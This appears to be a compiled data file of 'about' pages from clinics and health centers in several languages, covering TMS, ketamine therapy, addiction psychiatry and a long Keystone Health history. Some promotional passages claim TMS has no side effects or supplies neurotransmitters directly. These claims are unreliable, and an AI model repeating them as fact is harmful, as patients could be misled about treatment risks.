Call 978-878-8100 Dear Community, In response to a Community Needs Assessment and a fundamental shared belief that everyone deserves quality health care, regardless of health insurance status or\n        income, Bob Johnson and I were hired in 2001 to establish a nonprofit, Federally Qualified Community Health Center (FQCHC) in Fitchburg, Massachusetts. On February 25, 2002, Community Health\n        Connections (CHC) began providing services. Today we proudly operate five community health centers, including a dedicated Children’s Behavioral Health Center, located in the cities of Fitchburg,\n        Leominster and Gardner. Our growth over the past 23 years has been a direct result of our unwavering commitment to our Mission: to provide high quality, affordable healthcare in our\n        community, and to our Vision: to be the leading healthcare center here in North Central Massachusetts dedicated to eliminating barriers to care and building a healthier tomorrow for those we\n        serve.

Si tratta di farmaci in grado di ottenere con grande velocità una significativa riduzione dei sintomi della depressione e dell'ideazione suicidaria. La ketamina utilizzata per la terapia infusiva è composta da K-ketamina e S-ketamina ed è stata a lungo utilizzata come anestetico.   L’esketamina è la S-ketamina e somministrata per via intranasale. Somministrati a basse dosi, funzionano in modo diverso sui neurotrasmettitori nel cervello dagli antidepressivi tradizionali come gli SSRI.  Sono più veloci ad agire, con successo nel ridurre i sintomi della depressione e l'ideazione suicidaria.  Sono oggi considerato come un  Salvavita per i pazienti con depressione resistenti alle cure. L'esketamina è approvata dalla FDA (Food and Drug Administration) nel 2019 per curare la depressione resistente al trattamento. Non esistono i farmaci che fanno male o fanno bene. I farmaci fanno male quando vengono utilizzati in modo scorretto. Sia la ketamina che l'esketamina sono allucinogeni e un uso improprio può causare un pericolo medico. Per questo motivo, deve essere effettuato un attento esame per scegliere i candidati giusti al trattamento, che deve essere somministrato in un ambiente controllato con uno stretto monitoraggio a lungo termine. Scopri la terapia con Esketamina per la Depressione Resistente alle cure: un vero e proprio Salvavita per chi non abbia ottenuto risultati con altre terapie.

Our process respects each patient's unique mental health journey, offering data-driven, compassionate care from assessment to recovery. We offer a calm, welcoming environment designed to help you feel safe, seen, and supported every step of the way — because mental health care should never feel clinical or cold. With expert-guided care, ongoing check-ins, and a commitment to patient well-being, we make your healing experience personal and empowering. We aim to revolutionize mental health care by making non-invasive, drug-free treatments like Deep TMS accessible, effective, and personalized — empowering individuals to reclaim control of their emotional and cognitive well-being. To create a future where science-backed mental wellness is the norm, not the exception — where patients find relief without stigma, and care is guided by compassion, not just prescriptions. Positive Mind Care began with a single belief: mental health care must evolve. Founded by a team of psychiatrists, psychologists, and neurotherapy pioneers, we saw too many patients struggling with outdated treatments that didn’t work. This led us to introduce Deep TMS therapy in India — an approach rooted in neuroscience, designed to deliver lasting change without medication or side effects.

        "self_description": "Neben AD(H)S und Autismus sind Dyspraxie, Dyslexie und Dyskalkulie als Entwicklungsstörungen des frühkindlichen Gehirns zu sehen. Diese Störungen sind allerdings oft weniger „deutlich“ zu erkennen – obwohl sie wohl bei etwa 5-10% der Bevölkerung vorkommen. So fällt die Legasthenie oft erst auf, wenn die Kinder in der Schule nicht weiter kommen und die Dyspraxie wird als „Tolpatschigkeit“ eher ins Lächerliche gezogen, anstatt ernst genommen zu werden. Dabei handelt es sich nach unserer Vorstellung um komplexe kognitive Störungen – die ohne Behandlung und Training auch oder gerade im Erwachsenenalter zu gravierenden Folgen führen können, etwa zu Einschränkung in der Ausbildung oder Verlust des Arbeitsplatzes. Neben AD(H)S und Autismus sind Dyspraxie und Dyslexie als Entwicklungsstörungen des frühkindlichen Gehirns zu sehen. Diese Störungen sind allerdings oft weniger „deutlich“ zu erkennen – obwohl sie wohl bei etwa 5-10% der Bevölkerung vorkommen. So fällt die Legasthenie oft erst auf, wenn die Kinder in der Schule nicht weiter kommen und die Dyspraxie wird als „Tolpatschigkeit“ eher ins Lächerliche gezogen, anstatt ernst genommen zu werden. Dabei handelt es sich nach unserer Vorstellung um komplexe kognitive Störungen – die ohne Behandlung und Training auch oder gerade im Erwachsenenalter zu gravierenden Folgen führen können, etwa zu Einschränkung in der Ausbildung oder Verlust des Arbeitsplatzes. Die Dyslexie ist eine Entwicklungsstörung des Gehirns, die dazu führt, dass geschriebene Buchstaben nicht als grafische Einheit erkannt werden können beziehungsweise aus einzelnen Buchstaben die grafischen Einheiten von Worten nicht automatisiert gebildet werden können. Die Diagnose und Abgrenzung gegenüber Lernschwächen oder Analphabetismus sind wichtig, um den Betroffenen Hilfestellung und passende Unterstützung oder auch nur Nachteilsausgleiche verschaffen zu können. Auch wenn im deutschen Sprachgebrauch dieser Begriff (auch Legasthenie) mit einer Dyslexie oft verwechselt wird, handelt es sich hierbei doch tatsächlich um ein Lerndefizit. Die Abgrenzung ist vor allem deswegen wichtig, weil bei einer Lese-Rechtschreib-Schwäche durch intensives lernen eine Verbesserung erreicht werden kann, die bei einer Dyslexie so nicht möglich ist. Bei einer Dyspraxie sind das Verständnis des Körpers in seiner Orientierung und Position im umgebenden Raum einerseits und die unfallfreie Bewegung im Raum sowie die Kontrolle von Gliedmaßen und Körperposition nicht gut ausgebildet oder sogar äußerst fehlerhaft. Dadurch kommt es zu „Tolpatschigkeit“ bis hin zu Verletzungen bei eigentlich ganz alltäglichen Verrichtungen und Bewegungen. Durch die Diagnose kann eine Unterstützung und Hilfestellung erreicht werden, die dann z.B. ergotherapeutische Maßnahmen nach sich ziehen kann. Der Umgang mit Zahlen hat in unserem Alltag eine große Bedeutung – bei einer Dyskalkulie ist dies gestört oder Zahlen können gar nicht verstanden und bearbeitet werden. Diese Problematik fängt mit der Uhr an und endet noch lange nicht mit Geld und Kosten, sodass für die Betroffenen eine Diagnostik und die Überlegung für Hilfestellungen und Unterstützungen sehr wichtig ist. Arztgespräch Bei neuen Patienten steht in der Diagnostik immer das Gespräch an. Eine sorgfältige Erhebung von Beschwerden und Problemen, eingebettet in die Biografie des Patienten, ist uns sehr wichtig. Ganz besonders wichtig sind alte Unterlagen (Zeugnisse, Berichte aus Schule und Arbeitsstelle, Erzählungen von Eltern und Verwandten, etc.) Untersuchungen Entsprechend der Beschwerden und Befunde im Arztgespräch erfolgen dann die Untersuchungen. Wir führen eine Vielzahl an Untersuchungen im NPZ durch, etwa Leistungstests für kognitive Leistungen, Aufmerksamkeit, Schnelligkeit, Konzentration aber auch Depressions-Tests und ein EEG. Bei Bildgebungen (MRT, CCT) verweisen wir auf die Röntgenpraxen in der Nähe. Behandlungsplanung Es ist uns wichtig, dass wir dann eine Behandlung mit dem Patienten sorgfältig abstimmen. Gerade für die Behandlung von Dyslexie und Dyspraxie ist eine intensive Unterstützung im Alltag die wichtigste Aufgabe. Wir haben hier eine ganze Reihe von Angeboten entwickelt. Medikamente zur Behandlung von Dyslexie und Dyspraxie stehen nicht zur Verfügung – und machen auch nach unserem Verständnis in der Regel gar keinen Sinn. Transkranielle Magnetstimulation Wir haben im NPZ die Möglichkeit, Nervenzellen durch die gefahrlose Anwendung von Magnetwellen zu stimulieren. Nach der aktuellen Literatur sind hier positive Effekte bei Patienten mit Dyspraxie und Dyslexie beschrieben – wenn das eingebettet wird in ein multimodales Therapiemodell. Die komplexen und sehr umfangreichen Testungen erfordern es, dass der Patient die Kosten selbst übernimmt (sogenannte IGeL-Leistung). Die Kosten für diesen Anteil ergeben sich aus den Aufwänden, die bei der Dyspraxie-Testung entstehen. Grundsätzlich wird für Dyspraxie ein höherer Aufwand nötig, als dies bei ADHS oder ASD der Fall ist, weil hier erhebliche Anteile an „körperbezogenen“ Übungen erforderlich ist. Insofern ist die Berechnung auch etwas höher und es werden zwei Testtermine angesetzt. Bei Kindern scheint es ganz einfach zu sein: Dyslexie oder Legasthenie heißt, dass das Kind nicht richtig lesen (und nicht richtig schreiben) kann. Beschäftigt man sich mit dem Thema Dyslexie oder Legasthenie bei Erwachsenen, findet man häufig diese Idee auch noch – ein Betroffener kann nicht lesen oder schreiben. Ganz oft ist das jedoch nicht der Fall, Erwachsene mit Dyslexie können in der Regel sogar relativ gut lesen, allenfalls etwas langsam. Viel häufiger zeigt sich aber eine Einschränkung der Fähigkeit zur Aussprache, es finden sich Einschränkungen im auditorischen Kurzzeitgedächtnis (Arbeitsgedächtnisses) und bei den Fähigkeiten zur Verarbeitung visueller Abläufe. Diese Schwächen stehen im Gegensatz zu oftmals gut ausgeprägten verbalen Argumentationsfähigkeiten. Das zweite Missverständnis ist die Idee, dass Dyspraxie bei Erwachsenen vor allem eine motorische Ungeschicklichkeit bedeutet. Das stimmt bei Kindern – diese gelten als tollpatschig und ungeschickt. Erwachsene mit Dyspraxie haben aber ihre motorischen Koordinationsfähigkeiten im Laufe der Jahre oft gegenüber dem kindlichen Status verbessert – allenfalls sind sie etwas langsamer, weil sie sich auf komplexere Handlungen mehr konzentrieren müssen. Ihre Hauptschwierigkeiten in Ausbildung und Beruf hängen weniger mit motorischen als mit den kognitiven Aspekten der Dyspraxie zusammen, wie Schwierigkeiten bei der Sequenzierung und Strukturierung von Informationen, der Organisation komplexerer Abläufe und Aufgaben, der Zeitmessung und manchmal auch bei sozialen Fähigkeiten. Spezielle Übungen, begleitet durch erfahrene Therapeuten, gegebenenfalls unterstützt durch Software und Anpassungen am Arbeitsplatz können einen erheblichen Effekt zeigen. Dieser Effekt kann so ausgeprägt sein, dass er den Unterschied macht zwischen Erfolg oder schwerwiegende Misserfolg bis hin zum Verlust des Arbeitsplatzes oder vorzeitigen Beendigung des Studiums. Zuerst und als wichtigstes müssen Therapeuten Strategien vermitteln und sich nicht auf isolierte Symptome fokussieren. Erst nach der Vermittlung von Strategien zur Verbesserung des gesamten Ablaufs können Sie sich auf die spezifischen Aspekte beziehen, die bei der jeweiligen Person zu Beeinträchtigungen führen. Bei einem Schüler oder Studenten wird es sich um Fähigkeiten zur Verbesserung des Lernens handeln, auch hier sehr umgrenzt und gezielt die wichtigsten oder schwerwiegendsten Einschränkungen betreffend. In dem Fall eines Angestellten mit Bürotätigkeit wird man eine Analyse der Einschränkungen am Arbeitsplatz anfertigen und genau dort die wichtigsten Aspekte fördern. Grundsätzlich lässt sich für jede berufliche Tätigkeit eine Einschränkung durch die Dyslexie/Legasthenie finden und ein angepasstes Trainingsprogramm entwickeln. Es erscheint möglich, durch passende Unterstützung die individuelle Schwäche so gut zu kompensieren dass ein erfolgreiches Alltagsleben möglich ist. Ganz wichtig ist immer wieder für den Trainer und Therapeuten, die emotionalen Aspekte der Einschränkungen zu diskutieren und zu berücksichtigen. Durch Verbesserung der Leistungsfähigkeit im Rahmen der geplanten und trainierten Kompensationen können die Patienten eine höhere Lebensqualität und ein besseres Selbstwertgefühl erreichen. Die bei Kindern gebräuchlichen Untersuchungen und Tests für die Feststellung von Dyslexie/Legasthenie oder Dyspraxie lassen sich bei Erwachsenen so aufgrund der erlernten Kompensationsmechanismen häufig nicht anwenden bzw. führen nicht zu verwertbaren Ergebnissen. Gerade die Durchführung von Tests mit komplexeren visuellen und verbalen Aufforderungen führt zu erkennbaren Auffälligkeiten. Für den typischen Einsatz im therapeutischen Alltag sind individuelle Assessments mit einer genauen Erfassung des Ausmaßes der Einschränkung über alle fünf Domänen des kognitiven Befundes wichtig. Zunächst führen wir im NPZ eine Basisdiagnostik durch, bei der die intellektuelle Leistungsfähigkeit geprüft wird. Dazu werden durch standardisierte Testungen die fünf Domänen der Kognition überprüft und ein Querschnitt erhoben. Danach werden für die einzelnen Bereiche des persönlichen Daseins Assessment-Befunde zusammengestellt und nach der Wertigkeit für den Betroffenen sortiert. An den dadurch gefundenen Defiziten kann dann individuell gearbeitet werden. Name* E-Mail-Adresse* Telefonnummer Bitte lasse dieses Feld leer.

        "self_description": "Transcranial Magnetic Stimulation (TMS) is an innovative, FDA-approved, treatment for major depressive disorder. TMS has also shown remarkable success in treating other psychiatric conditions such as general anxiety disorder and post-traumatic stress disorder. A device is used to produce magnetic fields that induce electrical activity in specific regions of the brain associated with a particular mental health dysfunction. In the case of depression— TMS is used to improve neurotransmission by stimulating underactive regions of the brain involved in mood regulation. This same mechanism can be applied to treat a range of mental health conditions, by targeting the regions of the brain implicated by their symptoms. Repeated treatments to the affected areas of the brain over time can lead to long-lasting remission following treatment. TMS therapy utilizes a series of repetitious magnetic pulses to stimulate activity in a focal region of the brain. 1 Dunner et al, 2014, The Journal of Clinical Psychiatry: A Multisite, Naturalistic, Observational Study of Transcranial Magnetic Stimulation for Patients With Pharmacoresistant Major Depressive Disorder: Durability of Benefit Over a 1-year Follow-Up Period 2 Rush et al, 2006, Am J Psychiatry"

Through innovative treatments, ongoing support, and a commitment to destigmatizing mental health, we strive to create a world where everyone has access to the resources necessary for emotional and psychological well-being. Goal: Our goal is to foster resilience, promote healing, and enhance the quality of life for our clients, their families, and our communities. At the heart of Katie’s Way Plus is a story of personal loss, resilience, and a relentless pursuit of hope. Our journey began with a tragedy that transformed into a mission to serve those who serve us. In 2013, Jeff Mathis, our CEO, faced an unimaginable loss. His beloved daughter, Katie, took her own life. The pain of losing Katie was profound, but it also ignited a spark. Jeff realized that if his own family could be blindsided by such a tragedy, countless others could be suffering in silence too. This realization became even more poignant when he considered the unique mental health challenges faced by military personnel. Their service often exposes them to experiences that can lead to significant mental health struggles. Jeff felt a deep connection to these brave individuals, understanding that their battles often continue long after they’ve left the battlefield. Inspired by Katie’s memory and driven by a desire to support our military heroes, Jeff founded Katie’s Way Plus. His vision was to create a safe, welcoming space where military personnel could seek help for their mental health struggles without fear or stigma. He wanted to ensure that no other family would have to endure the pain his family went through. At Katie’s Way Plus, we honor Katie’s memory by providing comprehensive mental health services tailored to the unique needs of our military personnel. We offer innovative treatments like Deep Transcranial Magnetic Stimulation (Deep TMS), Exposure Therapy, and the Remote 24 program, all delivered by a team of compassionate physicians who truly care. Our story is one of turning personal loss into a beacon of hope. It’s a story of resilience, of dedication, and of a father’s love for his daughter. It’s a story that continues to unfold with every life we touch, every journey we share, and every step we take towards mental wellness. At Katie’s Way Plus, we believe that no hero should face their battles alone. We’re here to guide you on your journey, to walk with you every step of the way, and to ensure that Katie’s legacy lives on in the lives we help. 523 Walnut Avenue Kansas City, MO 64106"

        "self_description": "VASAV Health & Healing was founded on a simple but powerful belief: that you deserve more than just a diagnosis. Manish Nair envisioned a practice where modern, evidence-based psychiatry could seamlessly integrate with the timeless wisdom of holistic healing. We moved beyond the traditional model to create a collaborative space where board-certified physicians, nurse practitioners, therapists, and wellness coaches work together. Our mission is to understand your unique story and empower you with a personalized, comprehensive care plan that nurtures your mind, body, and spirit. Individualized medicine tailored to your unique genetic and lifestyle factors. A holistic, mind-body perspective that honors your interconnected well-being. A collaborative team of board-certified and certified experts. A focus on preventative health education to empower you for the long term. Mental health is not a destination, but a continuous journey of balance. Our goal is to walk that path beside you, offering guidance, expertise, and unwavering support. Founder & Board-Certified Psychiatrist Certified Mental Health Nurse Practitioner Certified Women's Health & Pregnancy Wellness Coach Personal Fitness Trainer Office Manager Medical Assistant Ready to Begin Your Healing Journey? Deciding to begin your wellness journey is a significant first step.  We'll guide you on what to expect, how to prepare, and how to easy any anxieties you may have about your initial visit. The connection you have with your \"provider\" is a key predictor of success. Learn about the importance of this relationship and what to look for in a \"mental health provider\" to ensure a good fit. Finding the right mental health provider is a personal process centred on connection and trust.  Look for a professional with credentials who specializes in the areas you need support with (e.g, anxiety, depression, chronic pain, women's health).  Most importantly, seek someone you feel comfortable and safe with.  The initial consultation is a great opportunity to ask questions and see if their approach is a good fit for you. Yes. Confidentiality is a foundational element of treatment.  Everything you discuss with your provider is legally and ethically protected. The only exceptions are specific situations where a provider is required by law to disclose information, such as immediate risk of serious harm to yourself or others, or cases of child abuse.  These limits to confidentiality will be clearly explained in your first session. While all therapies and treatments aim to improve well-being, different approaches use different methods.   The best approach depends entirely on your individual needs and goals, which you will explore with your provider. The duration of your wellness journey is lifelong and will vary from person to person.  Some people achieve their goals in a few months, while others benefit from longer-term support.  You will know your treatment plan is working when you start to see positive changes.  This might mean feeling a sense of relief, developing new coping skills, or noticing a reduction in the symptoms that brought you to treatment. It's an active process, and progress should be discussed regularly with your provider.

        "self_description": "CARMAhealth (“CARMA” stands for Collaborative Addiction Recovery Management and Assistance) was born in Austin, Texas on July 5th 2017, but the idea of providing access to high-quality, in-network primary care for addiction, psychiatric, and related medical problems was years in the making. During my years in academic medicine and as a practicing addiction psychiatrist, I witnessed countless people confronting what I called the “post discharge medical fumble.” As a dear friend once told me, “just about anyone can stay sober in rehab…it’s when rehab stops that the work begins…that’s when it gets real.” Here, we have thousands of people who spend time in drug rehab facilities who often benefit tremendously from the experience, but when it’s time for a “warm handoff” to a medical provider in their community, the ball gets dropped (the “fumble”). The “fumble” takes many forms: providers who can’t (or won’t) treat mental illness; providers who aren’t comfortable treating a person with a substance use disorder; providers who put people back on addicting substances thereby causing a recurrence; providers who are not in network with insurance and demand cash; or just no provider at all. After our first year, we realized that our patients who were in recovery from their addiction still suffered from co-morbid conditions like depression, bipolar disorder, and PTSD, so we quickly understood that we had to provide services for all psychiatric disorders. As a practice and a company, we now provide services for a broad spectrum of psychiatric disorders, and treat people regardless of a substance use disorder history. CARMAhealth is my effort to solve the problem of access to high-quality medical care for substance use disorders in our communities…to pick up the ball and run with it when it gets real! – Carlos Tirado, MD, MPH It’s worth noting that the practice also treats mental health disorders which is why I use Carma. I have been to other doctors in town and have never received the level of compassion and care for my health that I do here. CARMAhealth took over our daughter’s care and now we have…a doc who truly understands psychiatry, MAT and recovery! Grateful and relieved. Bravo, CARMAhealth! CARMAhealth is committed to providing behavioral health and primary care through the lifespan."

The magnet is gently placed against the scalp and targets the left dorsolateral prefrontal cortex, the part of the brain that is involved with mood regulation. This part of the brain is less active due to depression. As this magnetic field travels into the brain, it produces very small electrical currents activating neurons within the brain to release neurotransmitters like serotonin, dopamine, and norepinephrine—the same neurotransmitters that are provided artificially through antidepressant medications. dTMS is able to provide these neurotransmitters directly to the brain, essentially solving the problem at the source with zero systemic side effects.

The practice was built with a single purpose: to treat the whole person, not just the diagnosis. Located in Blue Bell, Pennsylvania, NPBTC offers an integrated model of care that brings together neurology, psychiatry, and physical therapy under one roof. By combining brain-based medicine with personalized physical rehabilitation and mental health support, we’re able to deliver more complete, compassionate care for complex conditions. We are proud to be one of the few practices in the region with this level of collaboration, and even prouder of the thousands of patients we’ve helped over the past decade. Whether you’re here for depression, epilepsy, migraines, OCD, dizziness, or functional neurological symptoms, we bring together a team that looks at your full picture. Our approach isn’t “pass-the-patient”—it’s coordinated, integrated, and deeply personal. We believe healing happens when providers work together. That’s why your care team may include: Neurology Psychiatry Physical Therapy Clinical support staff trained to guide you through every step You’ll never feel like just a chart number here.

We understand that walking through the door—especially for your first visit—is a big step. We’re here to meet you where you are and walk with you through every stage of your treatment. Behind every recovery story at NPBTC is a deeply committed team. Founder & Medical Director Dr. Knight is triple board-certified in Neurology, Epilepsy and Psychiatry with specialized fellowship training in Clinical Neurophysiology. As the founder of NPBTC, she brings over a decade of experience treating both neurological and psychiatric conditions, with a passion for integrated, whole-person care. She believes in building long-term patient relationships rooted in trust, compassion, and collaboration. Dr. Knight earned her B.A. in Biology from Rutgers – Newark College of Arts & Sciences and received her Doctor of Osteopathy degree (DO) from the New York College of Osteopathic Medicine in 2001. Driven by her dual passions for psychiatry and neurology, she completed two separate residencies: a neurology residency at UMDNJ (2005) and a psychiatry residency at the University of Maryland (2008). She later pursued a fellowship in Clinical Neurophysiology with a focus on epilepsy at Temple University Hospital. Dr. Knight’s clinical focus lies in epilepsy, seizure disorders, balance and dizziness conditions, and the overlap between neurological and psychiatric care. In addition to her private practice, she has held hospital positions in psychiatry and neurology throughout the Philadelphia area. Dr. Knight is a Fellow of the American Academy of Neurology and remains committed to delivering compassionate, multidisciplinary care. Doctor of Physical Therapy Dr. Barsky leads the physical therapy program at NPBTC with a focus on functional neurological disorders, balance issues, and vestibular rehabilitation. Known for his individualized approach, he works closely with the neurology and psychiatry teams to ensure patients receive seamless, multidisciplinary treatment plans that truly fit their lives. Dr. Barsky holds a B.S. in Exercise and Sports Science from Ursinus College (1997), an M.S. in Physical Therapy from Widener University (2002), and a DPT from Temple University (2013). His clinical background includes outpatient, acute care, and geriatric psychiatry settings. He helped establish the Vestibular and Balance Center of King of Prussia and has pursued extensive continuing education in vestibular rehab, concussion, dizziness, stroke, and orthopedic care. His treatment style combines hands-on physical therapy with education and long-term functional outcomes. Doctor of Physical Therapy Dr. Haslam partners with Dr. Barsky in providing expert physical therapy services at NPBTC. He has a special interest in neuro-rehabilitation and movement science, and is committed to helping each patient regain control, stability, and confidence through attentive, one-on-one care. Dr. Haslam earned his B.S. in Exercise Science from West Chester University (2016) and his Doctorate in Physical Therapy from Drexel University (2020). His passion for PT was shaped by caring for his father with Multiple Sclerosis, which inspired his interest in neurologic and vestibular care. He has clinical experience in home health, outpatient neuro, orthopedics, and sports rehab. During his training, he worked on research related to chronic pain and specialized in treating dizziness, balance, and vestibular conditions. His approach emphasizes one-on-one, individualized care that is both compassionate and goal-driven. Physician Assistant, Psychiatry Sarah is a certified physician assistant specializing in psychiatric care under the guidance of Dr. Knight. She plays a key role in evaluations and medication management, and is known for her empathetic presence, patient advocacy, and dedication to creating a safe, supportive therapeutic environment.

        "self_description": "Keystone Health A full-service, family-centered, primary care facility. In 1986, Joanne Cochran, Keystone’s President and CEO, co-founded the center to provide health care to the migrant  agricultural workers in Franklin County. At that time Keystone was comprised of three volunteers providing part-time seasonal health care to migrant agricultural workers in Franklin County and saw 500 patients during its first season. Today, Keystone Health has more than 650 employees and sees over 63,000 patients annually. Keystone Health is the only federally-qualified Community Health Center serving Franklin County. Community Health Centers are characterized by five essential elements that differentiate them from other providers: To learn more about Federally Qualified Health Centers, and how they are different from other doctor’s offices, click here . Keystone is co-founded by Joanne Cochran to provide health care to migrant farm workers in Franklin County. The Board expands the mission to include providing care to all residents of the area, regardless of ability to pay. Rural Health Clinic status is obtained and the corporation name is changed to Keystone Rural Health Center. A full-time, year-round family practice known as Keystone Health Center opens at 1331 S. Seventh Street. The uninsured and/or residents of Franklin County who couldn’t afford medical care now have access to primary care and auxiliary services. Keystone’s status is elevated to Federally Qualified Health Center for Medicare recipients and shortly thereafter for Medicaid recipients, which enables Keystone to receive cost reimbursement for patients receiving public insurances. Mrs. Cochran obtains Medically Underserved Population status for people in poverty in Franklin County and Health Professional Shortage Area status for Franklin County, making Keystone eligible to hire National Health Service Corp doctors, highly qualified physicians who chose to work in areas where doctors are needed in exchange for help from the government in repaying their education loans. Keystone receives the additional designation of Community Health Center, making the health center eligible to apply for Public Health Service grants. Because the family providers see that the lack of dental care is impacting the health of uninsured patients, Keystone opens its dental practice, now called Keystone Dental Care. Keystone becomes the administrator of the statewide migrant farmworker grant and contracts with healthcare providers to ensure that migrants across the state have access to care. Keystone receives a state grant to provide HIV/AIDS services in Franklin County, and in 1997 receives a state grant to provide the same services to migrants across Pennsylvania. Because the health center has outgrown the leased 1331 S. Seventh Street location, Keystone conducts a Capital Campaign to raise funds to build the 820 Fifth Avenue facility. The facility is completed in 1998. When two local gynecologists announce their upcoming retirements, Keystone acquires their practice, adding obstetrical services and later renaming the practice as Keystone Women’s Care. Keystone offers its patients discounted pharmaceuticals through the Federal 340B Drug Pricing Program. Keystone volunteers to undergo a Joint Commission on Accreditation of Healthcare Organizations three-day on-site survey and earns full accreditation. Because the Summit Health-owned Franklin County Pediatrics needs additional pediatricians, Keystone acquires the practice so that National Health Service Corp pediatricians can be hired. Keystone purchases the condo which houses the growing Keystone Dental Care. When a local cardiology practice announces it will disband, Keystone opens the Franklin County Heart Center to ensure that cardiology services will be available in the community. Because this is a specialty practice and not part of the Federally Qualified Health Center, a wholly-owned subsidiary, Keystone Physician Services, is formed. The opening of the practice brings the first interventional cardiologists to Franklin County. When Cumberland Valley Mental Health Services (CVMHS) closes, Keystone expands its behavioral health services by hiring additional therapists and two psychiatrists. Keystone also takes over the Crisis Intervention Program that was operated by CVMHS. Keystone undergoes its second Joint Commission survey and is reaccredited. Keystone adds two internal medicine physicians to its staff. Keystone celebrates its 20th anniversary. Administrative services are consolidated in one location, the newly built Summit-Keystone Pavilion. Several practices move into larger offices to accommodate the growing number of patients: Keystone Women’s Care and Franklin County Heart Center move to offices in the Pavilion. Franklin County Pediatrics moves into the Summit Health Center. Keystone’s internal medicine physicians separate from Keystone Family Medicine and move into a suite in the Summit Keystone Pavilion forming a new practice called Keystone Internal Medicine. Keystone is accredited again by The Joint Commission for a three-year period. Keystone Family Medicine begins using a scheduling model that allows patients to schedule any appointment within 24 hours. Keystone Health receives three grants through the American Recovery and Reinvestment Act to increase staffing at Franklin County Pediatrics, expand the Keystone Behavioral Health and Keystone Dental Care facilities, and construct a new building. Keystone Health expands the federal 340B discounted pharmaceuticals program to include more participating pharmacies across Franklin County. Keystone practices begin using Electronic Health Records. Keystone is reaccredited by The Joint Commission for a three-year period. The ARRA-funded expansion of the Keystone Dental Care facility is completed, adding five treatment rooms for a total of eighteen. Keystone celebrates its 25th anniversary. Franklin County Heart Center becomes part of the Federally Qualified Health Center and Keystone Physician Services, the wholly-owned subsidiary, is made inactive. The ARRA-funded expansion of the Keystone Behavioral Health facility is completed, adding treatment rooms and a group therapy room. The new building at 830 Fifth Avenue is completed. Keystone Internal Medicine, Keystone Women’s Care, and Keystone Pediatrics are relocated to the new building. Construction of the new facility was funded by an ARRA grant. Keystone Pharmacy opens in September in the new building. Keystone Walk-In Care opens in November in the new building. The year began with administration requesting that the mission statement be revised to more accurately reflect Keystone’s role in the community. The mission statement was revised to the following: Keystone Health improves the health and quality of life of the people and communities we serve. Keystone received $977, 500 dollars from the government related to its meeting the Meaningful Use criteria noted in the implementation of the Electronic Medical Record. These dollars help to defray the cost of the Electronic Medical Record which was implemented throughout all the practices of Keystone. USG (United Solutions Group) and Keystone signed a two year contract. Effective in June 2012, USG became Keystone’s contracted IT department and service. Keystone will no longer have its own IT operated department. Concomitantly, Keystone reorganized its purchasing and facility functions into two separate departments with new leadership at the head of each department. The Dental practice implemented its Electronic Dental Health Record in June of 2012 and appears to be an improvement with the delivery of dental care. Keystone hired its first Child/Adolescent psychiatrist and opened its Infectious Disease Practice with the joining of two new providers to the Keystone system. Keystone also relocated it HIV program (previously located at 820 Fifth Avenue) into the Infectious Diseases Program located at the 830 Cochran Professional Center. In July of 2012, Franklin County was included in the list of counties in the Commonwealth that are in mandated managed care for all primary care services. Previously only behavioral health services in Franklin County were in mandated managed care. This will cause a shift of patients into newly designated managed care health management organizations. Keystone hired a Public Relations Coordinator who will promote the Keystone practices throughout the community. Keystone was the recipient of a Patient Centered Medical Home that will be implemented at Keystone Family Medicine during the upcoming year. In early 2013, Keystone hired a consultant to begin the process of transitioning to the Patient Centered Medical Home delivery model of care. This model provides a way of organizing primary care that emphasizes care coordination to transform primary care into “what patients want it to be”. Medical homes can lead to higher quality and lower costs, and can improve patients’ and providers’ experience of care. Keystone Board approved Keystone adding Keystone Audiology and Speech to the scope of services offered, and in July, these services opened at 820 Fifth Avenue. Joint Commission visited Keystone for its triennial survey in late May 2013, which resulted in three years of certification as a Joint Commission approved health center. In July, Keystone is notified that is the recipient of an Outreach and Enrollment grant  from Centers for Medicaid and Medicare Services, and another for Outreach and Enrollment from HRSA. Keystone used these dollars to hire 11 Navigators to educate and enroll eligible individuals in Franklin County into Medicaid, CHIP and the State Marketplace Insurance plans. Keystone then went on to open Outreach and Enrollment sites in Greencastle, Chambersburg and Waynesboro. In March of 2014, Keystone Walk in Care became Keystone Urgent Care, and expanded its hours to 12 hours daily to better suit the needs of the community. Dr. Michael Colli (Pediatrician and medical director of Keystone Pediatrics) was appointed to the position of Chief Medical Officer of Keystone Health effective July 1, 2014, and Dr. Kawish Garg was appointed to the position of medical director of Keystone Behavioral Medicine. In August, Keystone opened its first STD clinic at Keystone Family Medicine. In October, Keystone was contacted by Family Health Council of Southcentral Pa to determine interest in offering Family Planning Services. In previous years, Keystone had contracted to provide these services. With Family Planning of Chambersburg closing its doors, there was no access to family planning services in Franklin County. Keystone agreed to provide family planning services to begin around the February 2015 timeframe, and will be held in conjunction with the STD program clinics. Also during October, Keystone offered a Free Vision Clinic, and thirty patients received free eye exams and glasses. In December, Dr. Jason Galicia was appointed as Medical Director of Keystone Internal Medicine. Also in December, Keystone Behavioral Health (Dr. Jagdeep Kaur) began to offer MAT (Medication Assisted Therapy) to help combat the Opioid Crisis. The year started with Governor Wolf expanding Medicaid using the Affordable Care Act and terminating “Healthy Pa.” This affected many of Keystone’s patients and the community as a whole. In February, Public Health Hygienists were placed at Keystone Pediatrics to perform dental screenings on site. Keystone started providing Family Planning Services to the community at the location of Keystone Family Medicine.  Dr. Yvette Brown was named Medical Director of STD and Family Planning Programs. Keystone Pediatrics opens its own Walk In Program. Keystone was awarded a $1 million dollar HRSA grant to expand dental by 10 operatories to equal 28 operatories in total. In March, Keystone began working with Edlantis, an occupational and speech therapy service program located at the School for Veterans Children in Scotland, and in May, Keystone took over this program under the name of Keystone Pediatric Therapies. Also in March, Keystone received a HRSA S-BIRT (Screening, Brief Intervention, Referral and Treatment) grant and began screening its patients for drug and alcohol usage. Keystone Pediatrics opened a satellite office in Waynesboro, PA in July of this year, with 3 Pediatricians and 1 CRNP staffing the practice. Keystone Internal Medicine and Keystone Family Medicine begin offering IRIS scans to diabetic patients. Mid-year, Keystone signed a contract providing behavioral health services to children and their families, through the Over the Rainbow community program. Through a $1 million federal grant, Keystone began expanding its dental office to accommodate new providers including a pediatric dentist who began in August. In the summer of 2016, Keystone developed a STD, HIV/AIDS, Healthy Woman, Outreach and Enrollment site located at 455 Lincoln Way East, and Keystone underwent is triennial Joint Commission survey and the outcome was that Keystone received accreditation from the Ambulatory Care Division. Keystone Infectious Disease added two physicians during the summer and early fall, totaling three ID physicians to cover both Keystone and Chambersburg Hospital. In September, Keystone opened its first school-based clinic at CASHS with staffing for four hours during school hours. In January of 2017, Keystone underwent an Office of the Inspector General Audit that HRSA mandated for all FQHCs. 